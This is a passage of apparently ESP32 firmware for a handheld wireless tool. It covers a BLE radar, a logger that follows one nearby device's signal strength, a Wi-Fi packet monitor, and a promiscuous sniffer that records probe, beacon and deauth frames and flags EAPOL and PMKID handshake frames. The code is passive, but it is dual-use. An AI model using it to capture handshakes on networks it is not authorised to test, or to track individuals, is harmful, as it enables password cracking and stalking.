            ? (18.0f + (normalized * (maxRadius - 22.0f)))
            : (12.0f + (normalized * (maxRadius - 16.0f)));
        float angle = focused
            ? -1.5707963f
            : (hashBLEMAC(String(bleMACs[i])) % 360) * 0.0174532925f;

        int dotX = centerX + cosf(angle) * radius;
        int dotY = centerY - sinf(angle) * radius;

        uint16_t dotColor = smoothedRSSI > -55 ? success : (smoothedRSSI > -72 ? accent : dotDim);
        int dotRadius = focused ? 5 : 3;
        if (focused) {
            tft.drawLine(centerX, centerY, dotX, dotY, dimColor565(success, 2));
        }
        tft.fillCircle(dotX, dotY, dotRadius, dotColor);
        if (focused) {
            tft.drawCircle(dotX, dotY, dotRadius + 3, success);
            tft.drawCircle(dotX, dotY, dotRadius + 6, dimColor565(success, 2));
        }
    }

    int displayRows[4] = {-1, -1, -1, -1};
    int rowCount = 0;
    if (focusedIndex >= 0) {
        displayRows[rowCount++] = focusedIndex;
    }
    for (int i = 0; i < bleRadarVisibleCount && rowCount < 4; i++) {
        if (i == focusedIndex) continue;
        displayRows[rowCount++] = i;
    }

    for (int i = 0; i < 4; i++) {
        int rowY = 82 + (i * 30);
        int entryIndex = displayRows[i];
        bool entryFocused = entryIndex >= 0 && strcmp(bleMACs[entryIndex], bleFocusedMAC) == 0;
        tft.fillRoundRect(154, rowY, 68, 24, 5, entryFocused ? tft.color565(34, 34, 34) : tft.color565(18, 18, 18));
        tft.drawRoundRect(154, rowY, 68, 24, 5, entryFocused ? accentSoft : tft.color565(44, 44, 44));

        if (entryIndex >= 0) {
            char name[10];
            const char* src = bleNames[entryIndex][0] ? bleNames[entryIndex] : bleMACs[entryIndex];
            strncpy(name, src, 9); name[9] = 0;
            tft.setTextColor(entryFocused ? success : accentSoft);
            tft.setCursor(160, rowY + 5);
            tft.print(name);
            tft.setTextColor(textSoft);
            tft.setCursor(160, rowY + 15);
            tft.print(bleRSSI[entryIndex]);
            tft.print(" dBm");
        } else {
            tft.setTextColor(textSoft);
            tft.setCursor(168, rowY + 9);
            tft.print("--");
        }
    }

    tft.fillRect(52, 240, 180, 24, bg);
    tft.setTextColor(success);
    tft.setCursor(52, 240);
    if (strlen(bleFocusedName) > 0) {
        char focusName[17];
        strncpy(focusName, bleFocusedName, 16);
        focusName[16] = '\0';
        tft.print(focusName);
    } else {
        tft.print("Select strongest");
    }

    tft.setTextColor(textSoft);
    tft.setCursor(52, 255);
    if (focusedIndex >= 0) {
        tft.print(bleRSSI[focusedIndex]);
        tft.print(" dBm locked");
    } else {
        tft.print("SEL locks strongest");
    }

    bleRadarNeedsRedraw = false;
}

void runBLERadar() {
    if (bleRadarLastScanMs == 0 || millis() - bleRadarLastScanMs >= bleRadarUpdateIntervalMs) {
        performBLEScan(240, true);
        bleRadarLastScanMs = millis();
        bleRadarNeedsRedraw = true;
    }

    drawBLERadar();
}

void drawBLELogger() {
    if (!bleLoggerFirstDraw && !bleLoggerNeedsRedraw) {
        return;
    }

    const uint16_t bg = ILI9341_BLACK;
    const uint16_t cardFill = tft.color565(18, 18, 18);
    const uint16_t accent = tft.color565(236, 236, 236);
    const uint16_t accentSoft = tft.color565(188, 188, 188);
    const uint16_t success = ILI9341_WHITE;
    const uint16_t textSoft = tft.color565(160, 160, 160);
    const uint16_t lineColor = tft.color565(52, 52, 52);
    const int graphX = 12;
    const int graphY = 118;
    const int graphW = 216;
    const int graphH = 136;
    const int plotX = graphX + 30;
    const int plotW = graphW - 38;
    const int plotY = graphY + 18;
    const int plotH = graphH - 34;

    if (bleLoggerFirstDraw) {
        tft.fillRect(0, 20, 240, 300, bg);
        tft.drawFastHLine(18, 67, 204, lineColor);

        tft.setTextSize(2);
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(18, 40);
        tft.print("Signal Logger");

        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 58);
        tft.print("Track one nearby device");

        tft.setTextColor(textSoft);
        tft.setCursor(12, 80);
        tft.print("Target");
        tft.setCursor(176, 80);
        tft.print("Rate");

        tft.fillRoundRect(12, 90, 150, 22, 5, cardFill);
        tft.drawRoundRect(12, 90, 150, 22, 5, tft.color565(44, 44, 44));
        tft.fillRoundRect(170, 90, 58, 22, 5, cardFill);
        tft.drawRoundRect(170, 90, 58, 22, 5, tft.color565(44, 44, 44));
        tft.fillRoundRect(graphX, graphY, graphW, graphH, 5, cardFill);
        tft.drawRoundRect(graphX, graphY, graphW, graphH, 5, tft.color565(44, 44, 44));

        tft.setTextColor(textSoft);
        tft.setCursor(graphX + 10, graphY + 8);
        tft.print("RSSI");
        for (int i = 0; i < 4; i++) {
            int y = graphY + 26 + (i * 26);
            tft.drawFastHLine(plotX, y, plotW, lineColor);
            int rssiLabel = -30 - (i * 20);
            tft.setTextColor(textSoft);
            tft.setCursor(graphX + 4, graphY + 20 + (i * 26));
            tft.print(rssiLabel);
        }

        tft.setTextColor(textSoft);
        tft.setCursor(12, 262);
        tft.print("UP/DN rate  SEL reset");
        tft.setCursor(12, 276);
        tft.print("LEFT back");

        bleLoggerFirstDraw = false;
    }

    String targetLabel = bleLoggerTargetName.length() > 0 ? bleLoggerTargetName : "No target";
    if (targetLabel.length() > 18) targetLabel = targetLabel.substring(0, 18);

    tft.fillRect(20, 96, 136, 10, cardFill);
    tft.setTextSize(1);
    tft.setTextColor(success);
    tft.setCursor(20, 97);
    tft.print(targetLabel);

    tft.fillRect(178, 96, 42, 10, cardFill);
    tft.setTextColor(accentSoft);
    tft.setCursor(178, 97);
    tft.print(bleLoggerSampleIntervalMs);
    tft.print("ms");

    tft.fillRect(graphX + 46, graphY + 8, 86, 10, cardFill);
    tft.setTextColor(success);
    tft.setCursor(graphX + 46, graphY + 8);
    tft.print(bleLoggerCurrentRSSI);
    tft.print(" dBm");

    tft.fillRect(plotX, plotY, plotW, plotH, ILI9341_BLACK);
    for (int i = 0; i < 4; i++) {
        int y = graphY + 26 + (i * 26);
        tft.drawFastHLine(plotX, y, plotW, lineColor);
    }

    if (bleLoggerSampleCount == 1) {
        int sample = constrain(bleLoggerSamples[(bleLoggerWriteIndex - 1 + BLE_LOGGER_POINTS) % BLE_LOGGER_POINTS], -100, -30);
        int y = graphY + 18 + ((-30 - sample) * (graphH - 34)) / 70;
        tft.drawPixel(plotX, y, success);
    } else if (bleLoggerSampleCount > 1) {
        int oldest = (bleLoggerWriteIndex - bleLoggerSampleCount + BLE_LOGGER_POINTS) % BLE_LOGGER_POINTS;
        int prevX = plotX;
        int prevY = graphY + graphH - 14;

        for (int i = 0; i < bleLoggerSampleCount; i++) {
            int idx = (oldest + i) % BLE_LOGGER_POINTS;
            int sample = bleLoggerSamples[idx];
            sample = constrain(sample, -100, -30);

            int x = plotX + (plotW * i) / max(1, BLE_LOGGER_POINTS - 1);
            int y = graphY + 18 + ((-30 - sample) * (graphH - 34)) / 70;

            if (i > 0) {
                tft.drawLine(prevX, prevY, x, y, accent);
            }

            tft.drawPixel(x, y, success);
            prevX = x;
            prevY = y;
        }
    }

    bleLoggerNeedsRedraw = false;
}

void runBLELogger() {
    if (bleLoggerTargetMAC.length() == 0) {
        bleLoggerCurrentRSSI = -100;
        bleLoggerNeedsRedraw = true;
        drawBLELogger();
        return;
    }

    if (bleLoggerLastSampleMs == 0 || millis() - bleLoggerLastSampleMs >= bleLoggerSampleIntervalMs) {
        int nextRSSI = bleLoggerCurrentRSSI;
        bool scanOk = performBLEScan(320, true);
        bleLoggerLastSampleMs = millis();

        if (scanOk) {
            syncBLELoggerTargetIndex();
            int deviceIndex = findBLEDeviceByMAC(bleLoggerTargetMAC);
            if (deviceIndex >= 0) {
                bleLoggerTargetIndex = deviceIndex;
                nextRSSI = bleRSSI[deviceIndex];
                bleFocusedRSSI = nextRSSI;
            }
        }

        bleLoggerCurrentRSSI = nextRSSI;
        bleLoggerSamples[bleLoggerWriteIndex] = bleLoggerCurrentRSSI;
        bleLoggerWriteIndex = (bleLoggerWriteIndex + 1) % BLE_LOGGER_POINTS;
        if (bleLoggerSampleCount < BLE_LOGGER_POINTS) {
            bleLoggerSampleCount++;
        }

        bleLoggerNeedsRedraw = true;
    }

    drawBLELogger();
}

void parseMac(String macStr, uint8_t *mac) {

    int values[6];

    sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
           &values[0], &values[1], &values[2],
           &values[3], &values[4], &values[5]);

    for (int i = 0; i < 6; ++i) {
        mac[i] = (uint8_t) values[i];
    }
}

// ===== MENU =====
const char* items[] = {
    "WiFi", "Bluetooth",
    "2.4GHz", "RF",
    "Settings", "Files"
};

const char* iconPaths[] = {
    "/icons/wifi.bin",
    "/icons/bluetooth.bin",
    "/icons/ghz24.bin",
    "/icons/rf.bin",
    "/icons/settings.bin",
    "/icons/sd_mount.bin"
};

int totalItems = 6;
int selectedIndex = 0;

// ===== LAYOUT =====
int tileW = 116;
int tileH = 76;
int spacing = 4;
int tileTopY = 42;
int tileVerticalSpacing = 14;

// ===== ANIMATION =====
#define IMG_W 150
#define IMG_H 166
#define FRAME_COUNT 12



// ===== ACTIVE MODE TYPES =====
enum ActiveModeType {
    ACTIVE_WIFI,
    ACTIVE_BLE,
    ACTIVE_FULL,
    ACTIVE_AUTO
};



unsigned long lastButtonPress = 0;
unsigned long lastUserInteractionMs = 0;
unsigned long screenSaverLastFrameMs = 0;
bool screenSaverActive = false;
bool screenSaverFrameReset = true;
bool screenSaverWakeReleaseRequired = false;
uint8_t screenSaverTimeoutIndex = 1;
uint8_t screenSaverStyleIndex = 0;
const uint8_t screenSaverTimeoutSeconds[] = {5, 10, 15, 20, 25, 30, 0};
const char* screenSaverStyleNames[] = {"Moire", "Orbit", "Rain", "Pixels"};
const uint8_t screenSaverTimeoutCount = sizeof(screenSaverTimeoutSeconds) / sizeof(screenSaverTimeoutSeconds[0]);
const uint8_t screenSaverStyleCount = sizeof(screenSaverStyleNames) / sizeof(screenSaverStyleNames[0]);

constexpr uint8_t tftBrightnessStepCount = 6;
// Lowest step is ~1% PWM (not 0) so the panel never goes fully black from this menu.
const uint8_t tftBrightnessDutySteps[tftBrightnessStepCount] = {3, 51, 102, 153, 204, 255};
uint8_t tftBrightnessStepIndex = tftBrightnessStepCount - 1;

static void loadTftBrightnessFromPrefs() {
#if TFT_BACKLIGHT_PIN >= 0
    uint8_t saved = prefs.getUChar("blDuty", 255);
    uint8_t bestIdx = 0;
    uint8_t bestDiff = 255;
    for (uint8_t i = 0; i < tftBrightnessStepCount; i++) {
        uint8_t d = tftBrightnessDutySteps[i];
        uint8_t diff = (saved > d) ? static_cast<uint8_t>(saved - d) : static_cast<uint8_t>(d - saved);
        if (diff < bestDiff) {
            bestDiff = diff;
            bestIdx = i;
        }
    }
    tftBrightnessStepIndex = bestIdx;
    applyTftBacklightDuty(tftBrightnessDutySteps[tftBrightnessStepIndex]);
#endif
}

static void persistTftBrightness() {
#if TFT_BACKLIGHT_PIN >= 0
    prefs.putUChar("blDuty", tftBrightnessDutySteps[tftBrightnessStepIndex]);
#endif
}

String getTftBrightnessLabel() {
#if TFT_BACKLIGHT_PIN < 0
    return String("N/A");
#else
    uint8_t d = tftBrightnessDutySteps[tftBrightnessStepIndex];
    unsigned pct = (static_cast<unsigned>(d) * 100u + 127u) / 255u;
    return String(pct) + "%";
#endif
}

enum PacketMode {
    PACKET_AUTO,
    PACKET_MANUAL
};

PacketMode packetMode = PACKET_AUTO;

int selectedChannel = 1;
int wifiSnifferHopChannel = 1;
int wifiSnifferStrongestChannel = 1;
int wifiSnifferStrongestRssi = -95;
unsigned long wifiSnifferLastHop = 0;

bool pressedOnce(int pin) {
    if (!isPressed(pin)) return false;
    lastButtonPress = millis();
    return true;
}

ActiveModeType activeMode = ACTIVE_AUTO;


void wifi_sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {

    const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buf;
    int ch = ppkt->rx_ctrl.channel;

    // 🔥 THIS FIXES PACKET COUNTER
    packetCount++;

    if (ch >= 1 && ch <= 13) {

        // stronger + faster response
        channelPower[ch] += 8;

        if (ch > 1) channelPower[ch - 1] += 3;
        if (ch < 13) channelPower[ch + 1] += 3;
    }
}

void packetTask(void *param) {
    // Ensure sigMonRssi is accessible
    extern int8_t sigMonRssi[14];

    bool promiscArmed = false;

    int hopChannel = 1;
    unsigned long lastHop = 0;

    while (true) {
        bool wantsPacketSniffer =
            currentRadioMode == WIFI_PACKET_MONITOR ||
            currentRadioMode == WIFI_SIGNAL_MONITOR ||
            currentRadioMode == WIFI_CHANNEL_ANALYZER;

        if (!wantsPacketSniffer || radioLocked || isBLEMode(currentRadioMode)) {
            if (promiscArmed) {
                esp_wifi_set_promiscuous_rx_cb(NULL);
                esp_wifi_set_promiscuous(false);
                promiscArmed = false;
            }
        } else if (!promiscArmed) {
            if (!WiFi.mode(WIFI_STA)) {
                wifiInitRetryAt = millis() + 1500UL;
                vTaskDelay(200 / portTICK_PERIOD_MS);
                continue;
            }

            // Set MAXIMUM WiFi power for maximum range and better reception
            esp_wifi_set_max_tx_power(84);  // 21 dBm = maximum

            // Use the extended callback for all passive WiFi monitor tools so
            // Signal Monitor, Packet Monitor, and Channel Analyzer stay on the
            // same data path and don't quietly desync their state.
            esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_extended);
            if (esp_wifi_set_promiscuous(true) != ESP_OK) {
                esp_wifi_set_promiscuous_rx_cb(NULL);
                wifiInitRetryAt = millis() + 1500UL;
                vTaskDelay(200 / portTICK_PERIOD_MS);
                continue;
            }

            promiscArmed = true;
        }

        if (radioLocked || radioModeTransitionActive() || isBLEMode(currentRadioMode)) {
            vTaskDelay(200 / portTICK_PERIOD_MS);
            continue;
        }

        // 🔥 BLOCK WHEN BLE IS USING RADIO
        bool packetMonitorMode = (currentRadioMode == WIFI_PACKET_MONITOR);
        bool signalMonitorMode = (currentRadioMode == WIFI_SIGNAL_MONITOR);
        bool channelAnalyzerMode = (currentRadioMode == WIFI_CHANNEL_ANALYZER);

        if (!packetMonitorMode && !signalMonitorMode && !channelAnalyzerMode) {
            vTaskDelay(100 / portTICK_PERIOD_MS);
            continue;
        }

        if (packetMonitorMode && packetMode == PACKET_AUTO) {

            if (millis() - lastHop > 180) {

                hopChannel++;
                if (hopChannel > 13) hopChannel = 1;

                esp_wifi_set_channel(hopChannel, WIFI_SECOND_CHAN_NONE);
                lastHop = millis();
            }

        } else if (packetMonitorMode) {
            esp_wifi_set_channel(selectedChannel, WIFI_SECOND_CHAN_NONE);
        } else {
            if (millis() - wifiSnifferLastHop > 80UL) {  // 80ms per channel — full sweep in ~1s
                wifiSnifferHopChannel++;
                if (wifiSnifferHopChannel > 13) wifiSnifferHopChannel = 1;
                esp_wifi_set_channel(wifiSnifferHopChannel, WIFI_SECOND_CHAN_NONE);
                wifiSnifferLastHop = millis();
            }
        }

        for (int i = 1; i <= 13; i++) {
            float smoothFactor = packetMonitorMode ? 0.5f : 0.38f;
            float decayFactor = packetMonitorMode ? 0.45f : 0.68f;

            smoothedPower[i] = (smoothedPower[i] * (1.0f - smoothFactor)) + (channelPower[i] * smoothFactor);
            channelPower[i] *= decayFactor;
            if (channelPower[i] < 0.2f) channelPower[i] = 0;
        }

        if (signalMonitorMode) {
            wifiSnifferStrongestChannel = 1;
            wifiSnifferStrongestRssi = -95;
            for (int i = 1; i <= 13; i++) {
                if (sigMonRssi[i] > wifiSnifferStrongestRssi) {
                    wifiSnifferStrongestRssi = sigMonRssi[i];
                    wifiSnifferStrongestChannel = i;
                }
            }
        }

        vTaskDelay(20 / portTICK_PERIOD_MS);
    }
}



// ===== SMOOTHED POWER =====
// (smoothedPower[14] already declared globally — no duplicate needed)

// ===== PACKET MONITOR =====
void runPacketMonitor() {

    static unsigned long lastDraw = 0;
    static int lastPacketCount = 0;
    static int packetsPerSec = 0;
    static unsigned long lastPacketCalc = 0;
    const uint16_t bg = ILI9341_BLACK;
    const uint16_t accent = tft.color565(100, 200, 255);  // Blue accent like other tools
    const uint16_t textSoft = tft.color565(160, 160, 160);
    const uint16_t rowFill = tft.color565(18, 18, 18);

    if (packetMode == PACKET_AUTO) {
        lastSelectedChannel = -1;
    }

    if (wifiPacketFirstDraw) {
        tft.fillRect(0, 20, 240, 300, bg);
        tft.drawFastHLine(8, 68, 224, tft.color565(52, 52, 52));

        tft.setTextSize(2);
        tft.setTextColor(accent);
        tft.setCursor(18, 40);
        tft.print("Packet Monitor");

        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 58);
        tft.print("Live WiFi traffic");

        wifiPacketFirstDraw = false;
    }

    // FPS LIMIT (smooth + no flicker)
    if (millis() - lastDraw < 70) return;
    lastDraw = millis();

    // ===== PACKET RATE =====
    if (millis() - lastPacketCalc > 1000) {
        packetsPerSec = packetCount - lastPacketCount;
        lastPacketCount = packetCount;
        lastPacketCalc = millis();
    }

    // ===== INPUT =====
    if (pressedOnce(BTN_SELECT)) {
        packetMode = (packetMode == PACKET_AUTO) ? PACKET_MANUAL : PACKET_AUTO;
        tft.fillRect(12, 74, 216, 160, bg);
        lastSelectedChannel = -1;
        wifiPacketFirstDraw = true;
    }

    if (packetMode == PACKET_MANUAL) {
        if (pressedOnce(BTN_UP)) {
            selectedChannel++;
            if (selectedChannel > 13) selectedChannel = 1;
        }
        if (pressedOnce(BTN_DOWN)) {
            selectedChannel--;
            if (selectedChannel < 1) selectedChannel = 13;
        }
    }

    // ===== MODE BADGE =====
    tft.fillRoundRect(14, 74, 66, 20, 4, tft.color565(22, 22, 22));
    tft.setTextSize(1);
    tft.setTextColor(accent);
    tft.setCursor(20, 80);
    tft.print("Mode ");
    tft.setTextColor(ILI9341_WHITE);
    tft.print(packetMode == PACKET_AUTO ? "Auto" : "Man");

    if (packetMode == PACKET_MANUAL) {
        tft.fillRoundRect(88, 74, 66, 20, 4, tft.color565(22, 22, 22));
        tft.setTextColor(accent);
        tft.setCursor(94, 80);
        tft.print("Ch ");
        tft.setTextColor(ILI9341_WHITE);
        tft.print(selectedChannel);
    } else {
        tft.fillRect(88, 74, 66, 20, bg);
    }

    // ===== PACKET RATE BADGE =====
    tft.fillRoundRect(162, 74, 62, 20, 4, tft.color565(22, 22, 22));
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(170, 80);
    tft.print(packetsPerSec);
    tft.print("p/s");

    // ===== GRAPH =====
    tft.drawRect(12, 98, 216, 118, tft.color565(44, 44, 44));
    for (int grid = 1; grid < 4; grid++) {
        int y = 98 + (grid * 29);
        tft.drawFastHLine(13, y, 214, tft.color565(28, 28, 28));
    }

    for (int ch = 1; ch <= 13; ch++) {
        int x = map(ch, 1, 13, 20, 220);
        float val = smoothedPower[ch];

        if (packetMode == PACKET_MANUAL && ch != selectedChannel) {
            val *= 0.2;
        }

        int height = constrain(val * 3.3, 0, 108);

        // Clear column
        tft.fillRect(x - 7, 100, 14, 114, bg);

        // Highlight selected channel
        if (packetMode == PACKET_MANUAL && ch == selectedChannel) {
            tft.drawFastVLine(x, 101, 112, tft.color565(40, 80, 120));
        }

        // Draw bar
        for (int y = 0; y < height; y++) {
            float ratio = (float)y / 108.0f;
            uint16_t color;
            if (ratio < 0.33f) color = tft.color565(0, 120, 255);
            else if (ratio < 0.66f) color = tft.color565(0, 220, 100);
            else color = tft.color565(255, 80, 40);
            
            if (packetMode == PACKET_MANUAL && ch == selectedChannel) {
                color = tft.color565(255, 220, 80);  // Gold for selected
            }
            
            tft.drawFastHLine(x - 5, 207 - y, 10, color);
        }

        // Channel label
        tft.setTextSize(1);
        tft.setTextColor((packetMode == PACKET_MANUAL && ch == selectedChannel) ? ILI9341_WHITE : textSoft);
        tft.setCursor(x - 3, 220);
        tft.print(ch);
    }

    // ===== INSTRUCTIONS =====
    tft.setTextColor(textSoft);
    tft.setCursor(12, 278);
    if (packetMode == PACKET_AUTO) {
        tft.print("SEL mode  LEFT back");
    } else {
        tft.print("UP/DN ch  SEL mode  LEFT back");
    }
}

// ===== WIFI SNIFFER SHARED STATE =====
// Single shared buffer — only one sniff mode active at a time, saves ~6KB DRAM
#define SNIFF_MAX_ENTRIES 20

struct SniffEntry {
    char mac[18];
    char ssid[16];  // trimmed further to save RAM
    int8_t rssi;
    uint8_t channel;
    uint16_t count;
};

static SniffEntry sniffBuf[SNIFF_MAX_ENTRIES];
static int sniffBufCount = 0;

// Aliases so existing callback code compiles unchanged
#define probeEntries       sniffBuf
#define beaconSniffEntries sniffBuf
#define deauthEntries      sniffBuf
#define eapolEntries       sniffBuf
#define stationEntries     sniffBuf
#define rawEntries         sniffBuf
#define scanAllEntries     sniffBuf

#define probeCount       sniffBufCount
#define beaconSniffCount sniffBufCount
#define deauthCount      sniffBufCount
#define eapolCount       sniffBufCount
#define stationCount     sniffBufCount
#define rawCount         sniffBufCount
#define scanAllCount     sniffBufCount

// Signal monitor per-channel RSSI
static bool sigMonFirstDraw = true;

// Packet count breakdown
static uint32_t pktCountMgmt = 0;
static uint32_t pktCountData = 0;
static uint32_t pktCountCtrl = 0;
static bool pktCountFirstDraw = true;

static bool sniffListNeedsRedraw = true;
static int8_t sniffScrollOffset = 0;
static int8_t sniffSelectedIndex = 0;

// ===== SNIFFER HELPERS =====
static void macToStr(const uint8_t* m, char* out) {
    sprintf(out, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
}

static void upsertSniffEntry(SniffEntry* list, int& count, const char* mac, const char* ssid, int8_t rssi, uint8_t ch) {
    // Deduplicate by SSID when non-empty (multiple APs same SSID = one entry, best RSSI)
    // Deduplicate by MAC when SSID is empty (hidden networks)
    bool hasSsid = (ssid && ssid[0] != '\0');
    String infraHint = classifyWiFiInfrastructure(hasSsid ? String(ssid) : String(""), String(mac));
    char displayText[16];
    strncpy(displayText, ssid ? ssid : "", sizeof(displayText) - 1);
    displayText[sizeof(displayText) - 1] = 0;
    if (infraHint.length() > 0 && (!hasSsid || currentRadioMode == WIFI_SCAN_ALL)) {
        strncpy(displayText, infraHint.c_str(), sizeof(displayText) - 1);
        displayText[sizeof(displayText) - 1] = 0;
    }

    for (int i = 0; i < count; i++) {
        bool match = hasSsid
            ? (strcmp(list[i].ssid, ssid) == 0)   // same SSID = same network
            : (strcmp(list[i].mac, mac) == 0);     // hidden: match by MAC
        if (match) {
            // Keep best (strongest) RSSI and update channel
            if (rssi > list[i].rssi) {
                list[i].rssi = rssi;
                list[i].channel = ch;
                strncpy(list[i].mac, mac, 17); list[i].mac[17] = 0;
                if (list[i].ssid[0] == 0 && displayText[0] != 0) {
                    strncpy(list[i].ssid, displayText, 15); list[i].ssid[15] = 0;
                }
            }
            list[i].count++;
            return;
        }
    }
    if (count >= SNIFF_MAX_ENTRIES) {
        memmove(&list[0], &list[1], sizeof(SniffEntry) * (SNIFF_MAX_ENTRIES - 1));
        count = SNIFF_MAX_ENTRIES - 1;
    }
    strncpy(list[count].mac, mac, 17); list[count].mac[17] = 0;
    strncpy(list[count].ssid, displayText, 15); list[count].ssid[15] = 0;
    list[count].rssi = rssi;
    list[count].channel = ch;
    list[count].count = 1;
    count++;
}

static void appendSniffEntry(SniffEntry* list, int& count, const char* mac, const char* ssid, int8_t rssi, uint8_t ch) {
    if (count >= SNIFF_MAX_ENTRIES) {
        memmove(&list[0], &list[1], sizeof(SniffEntry) * (SNIFF_MAX_ENTRIES - 1));
        count = SNIFF_MAX_ENTRIES - 1;
    }
    String infraHint = classifyWiFiInfrastructure(ssid ? String(ssid) : String(""), String(mac));
    const char* displayText = (infraHint.length() > 0 && (!ssid || ssid[0] == 0)) ? infraHint.c_str() : ssid;
    strncpy(list[count].mac, mac, 17); list[count].mac[17] = 0;
    strncpy(list[count].ssid, displayText ? displayText : "", 15); list[count].ssid[15] = 0;
    list[count].rssi = rssi;
    list[count].channel = ch;
    list[count].count = 1;
    count++;
}

static bool wifiFrameHasPmkidTag(const uint8_t* payload, uint32_t frameLen, int llcOffset) {
    if (!payload || frameLen <= (uint32_t)(llcOffset + 8)) {
        return false;
    }

    for (uint32_t i = (uint32_t)(llcOffset + 8); i + 3 < frameLen; i++) {
        if (payload[i] == 0x00 &&
            payload[i + 1] == 0x0F &&
            payload[i + 2] == 0xAC &&
            payload[i + 3] == 0x04) {
            return true;
        }
    }

    return false;
}

static int wifiFindEapolOffset(const uint8_t* payload, uint32_t frameLen) {
    if (!payload || frameLen < 32) {
        return -1;
    }

    int headerLen = 24;
    const bool toDs = (payload[1] & 0x01) != 0;
    const bool fromDs = (payload[1] & 0x02) != 0;
    if (toDs && fromDs) {
        headerLen = 30;
    }
    if ((payload[0] & 0x80) != 0) {
        headerLen += 2;  // QoS data
    }

    auto matchesSnapEapol = [&](int offset) -> bool {
        return offset >= 0 &&
               frameLen > (uint32_t)(offset + 7) &&
               payload[offset] == 0xAA &&
               payload[offset + 1] == 0xAA &&
               payload[offset + 6] == 0x88 &&
               payload[offset + 7] == 0x8E;
    };

    if (matchesSnapEapol(headerLen)) {
        return headerLen;
    }

    const int searchStart = max(24, headerLen - 2);
    const int searchEnd = min((int)frameLen - 8, headerLen + 12);
    for (int offset = searchStart; offset <= searchEnd; offset++) {
        if (matchesSnapEapol(offset)) {
            return offset;
        }
    }

    return -1;
}

// Extended sniffer callback that feeds all sniff modes
void wifi_sniffer_extended(void* buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t* ppkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = ppkt->payload;
    int8_t rssi = ppkt->rx_ctrl.rssi;
    uint8_t ch = ppkt->rx_ctrl.channel;

    packetCount++;

    if (ch >= 1 && ch <= 13) {
        channelPower[ch] += 8;
        if (ch > 1) channelPower[ch - 1] += 3;
        if (ch < 13) channelPower[ch + 1] += 3;
    }

    // Packet Count breakdown
    if (currentRadioMode == WIFI_PACKET_COUNT) {
        if (type == WIFI_PKT_MGMT) pktCountMgmt++;
        else if (type == WIFI_PKT_DATA) pktCountData++;
        else pktCountCtrl++;
        return;
    }

    if (currentRadioMode == WIFI_PACKET_MONITOR) {
        return;
    }

    if (currentRadioMode == WIFI_SIGNAL_MONITOR) {
        if (ch >= 1 && ch <= 13 && rssi > sigMonRssi[ch]) {
            sigMonRssi[ch] = rssi;
        }
        return;
    }

    // Channel Analyzer: just uses channelPower[], no entry list needed
    if (currentRadioMode == WIFI_CHANNEL_ANALYZER) return;

    if (ppkt->rx_ctrl.sig_len < 10) return;

    // Allow MISC frames through for raw/scan-all modes
    bool isMgmt = (type == WIFI_PKT_MGMT);
    bool isData = (type == WIFI_PKT_DATA);
    bool isCtrl = (type == WIFI_PKT_CTRL);
    bool isMisc = (type == WIFI_PKT_MISC);

    if (!isMgmt && !isData && !isCtrl && !isMisc) return;
    if (ppkt->rx_ctrl.sig_len < 10) return;

    // For non-mgmt/data frames, only process in raw capture / scan-all
    bool shortFrame = (ppkt->rx_ctrl.sig_len < 24);
    if (shortFrame && currentRadioMode != WIFI_RAW_CAPTURE && currentRadioMode != WIFI_SCAN_ALL) return;

    uint8_t frameType = payload[0] & 0xFC;
    char mac[18];
    char ssid[21] = "";

    // Extract SSID from Information Element at given offset
    #define EXTRACT_SSID(ieOffset) do { \
        if ((uint32_t)((ieOffset) + 2) < ppkt->rx_ctrl.sig_len && payload[(ieOffset)] == 0x00) { \
            uint8_t _len = payload[(ieOffset)+1]; if (_len > 20) _len = 20; \
            memcpy(ssid, &payload[(ieOffset)+2], _len); ssid[_len] = 0; \
        } \
    } while(0)

    // Probe Request: 0x40
    if (currentRadioMode == WIFI_PROBE_SNIFF && frameType == 0x40) {
        macToStr(&payload[10], mac);
        EXTRACT_SSID(24);
        upsertSniffEntry(sniffBuf, sniffBufCount, mac, ssid, rssi, ch);
        sniffListNeedsRedraw = true;
    }

    // Beacon: 0x80
    else if (currentRadioMode == WIFI_BEACON_SNIFF && frameType == 0x80) {
        macToStr(&payload[10], mac);
        EXTRACT_SSID(36);
        upsertSniffEntry(sniffBuf, sniffBufCount, mac, ssid, rssi, ch);
        sniffListNeedsRedraw = true;
    }

    // Deauth: 0xC0 (Bug 1.2 fix: add validation to filter false positives)
    else if (currentRadioMode == WIFI_DEAUTH_SNIFF && frameType == 0xC0) {
        // Validate deauth frame: must be at least 26 bytes (header + reason code)
        if (ppkt->rx_ctrl.sig_len >= 26) {
            // Check reason code is valid (1-65535, but typically 1-24)
            uint16_t reasonCode = payload[24] | (payload[25] << 8);
            // Filter out obviously invalid reason codes
            if (reasonCode > 0 && reasonCode < 256) {
                macToStr(&payload[10], mac);
                // Check for duplicate in recent history (simple duplicate filter)
                static char lastDeauthMac[18] = "";
                static unsigned long lastDeauthTime = 0;
                unsigned long now = millis();
                // Only record if different MAC or >100ms since last from same MAC
                if (strcmp(mac, lastDeauthMac) != 0 || (now - lastDeauthTime) > 100) {
                    upsertSniffEntry(sniffBuf, sniffBufCount, mac, "", rssi, ch);
                    sniffListNeedsRedraw = true;
                    strncpy(lastDeauthMac, mac, sizeof(lastDeauthMac));
                    lastDeauthTime = now;
                }
            }
        }
    }

    // EAPOL
    else if (currentRadioMode == WIFI_EAPOL_SCAN && type == WIFI_PKT_DATA) {
        int offset = wifiFindEapolOffset(payload, ppkt->rx_ctrl.sig_len);
        if (offset >= 0) {
            macToStr(&payload[10], mac);
            const char* label = wifiFrameHasPmkidTag(payload, ppkt->rx_ctrl.sig_len, offset)
                ? "PMKID"
                : "EAPOL";
            upsertSniffEntry(sniffBuf, sniffBufCount, mac, label, rssi, ch);
            sniffListNeedsRedraw = true;
        }
    }

    // Station Sniff: data frames
    else if (currentRadioMode == WIFI_STATION_SNIFF && type == WIFI_PKT_DATA) {
        macToStr(&payload[10], mac);
